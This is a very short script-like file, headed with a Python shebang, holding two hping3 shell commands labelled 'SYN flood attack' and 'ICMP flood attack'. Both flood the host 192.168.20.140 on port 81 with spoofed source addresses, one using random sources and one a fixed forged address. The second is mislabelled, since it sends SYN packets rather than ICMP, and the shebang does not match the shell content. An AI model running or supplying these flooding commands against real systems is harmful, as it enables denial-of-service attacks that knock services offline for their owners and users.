#!/usr/bin/env python

# SYN flood attack
sudo hping3 -c 10000 -d 120 -S -w 64 -p 81 --flood --rand-source 192.168.20.140

# ICMP flood attack
sudo hping3 -S -a 10.0.0.196 --flood -p 81 192.168.20.140